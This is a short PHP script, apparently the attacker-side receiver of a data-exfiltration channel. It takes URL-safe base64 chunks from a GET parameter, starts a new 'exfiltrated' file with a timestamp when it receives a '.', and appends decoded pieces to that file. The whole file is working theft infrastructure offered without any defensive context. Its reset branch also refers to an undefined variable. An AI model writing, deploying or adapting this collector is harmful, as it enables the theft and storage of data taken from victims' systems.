<?php
 $Data = $_GET['input'];
 if(strcmp($Data, '.') == 0){
    $File = "exfiltrated".Date('Y-m-d_h:i:s').".txt";
    $Handle = fopen($File, 'w');
    fclose($Handle);
    $timestamp_file = "timestamp.txt";
    file_put_contents($timestamp_file,"");
    file_put_contents($timestamp_file,Date('Y-m-d_h:i:s'));
 }else if(strcmp($Data, '~') == 0){
    $file = "timestamp.txt";
    file_put_contents($timestamp_file,"");
 }else{
    $timestamp = trim(file_get_contents("timestamp.txt"));
    $File = "exfiltrated{$timestamp}.txt";
    write_file($File, $Data);
 }

 function write_file($File, $Data){
    $Handle = fopen($File, 'a');
    $replace_plus = str_replace("-","+",$Data);
    $replace_slash = str_replace("_","/",$replace_plus);
    fwrite($Handle, $replace_slash);
    fclose($Handle);
 }

?>
